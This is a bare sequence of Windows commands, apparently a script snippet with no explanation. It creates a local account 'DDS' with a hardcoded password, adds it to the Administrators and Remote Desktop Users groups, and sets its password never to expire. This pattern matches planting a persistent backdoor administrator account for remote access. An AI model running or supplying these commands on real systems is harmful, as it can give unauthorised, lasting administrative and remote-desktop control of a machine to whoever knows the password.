net user /add DDS Aries2025!
net localgroup "Remote Desktop Users" DDS /add
net localgroup Administrators DDS /add
WMIC USERACCOUNT WHERE Name='DDS' SET PasswordExpires=FALSE
